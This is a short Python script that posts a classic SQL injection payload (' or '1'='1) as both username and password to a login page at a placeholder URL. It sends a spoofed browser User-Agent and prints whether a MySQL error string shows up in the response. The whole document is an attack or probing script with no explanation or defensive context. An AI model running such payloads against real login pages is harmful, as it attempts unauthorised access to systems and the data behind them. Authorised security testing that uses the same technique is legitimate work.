import requests

# Enter the URL of the target web application
url = "https://example.com/login"

# Define the payload to be used for the SQL injection
payload = "' or '1'='1"

# Define the headers for the HTTP request
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Referer": url
}

# Define the parameters for the HTTP request
params = {
    "username": payload,
    "password": payload
}

# Send the HTTP request to the target web application
response = requests.post(url, headers=headers, data=params)

# Check if the response contains any SQL errors
if "mysql_fetch_array()" in response.text:
    print("SQL injection vulnerability detected!")
else:
    print("No SQL injection vulnerabilities detected.")
